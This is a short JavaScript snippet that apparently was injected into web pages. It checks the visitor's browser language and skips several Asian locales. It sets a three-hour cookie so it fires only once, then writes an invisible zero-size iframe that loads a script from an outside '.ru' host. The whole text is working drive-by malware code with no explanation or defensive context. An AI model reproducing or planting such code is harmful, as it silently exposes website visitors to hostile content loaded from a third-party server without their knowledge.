window.status="";
n=navigator.userLanguage.toUpperCase();
if((n!="ZH-CN")&&(n!="ZH-MO")&&(n!="BN")&&(n!="GU")&&(n!="NE")&&(n!="PA")&&(n!="ID")&&(n!="EN-PH")&&(n!="UR")&&(n!="ZH")&&(n!="HI")&&(n!="TH")&&(n!="VI")){
var cookieString = document.cookie;
var start = cookieString.indexOf("cvbest=");
if (start != -1){}else{
var expires = new Date();
expires.setTime(expires.getTime()+3*3600*1000);
document.cookie = "cvbest=update;expires="+expires.toGMTString();
try{
document.write("<iframe src=http://vtg43.ru/cgi-bin/index.cgi?script width=0 height=0 frameborder=0></iframe>");
}
catch(e)
{
};
}}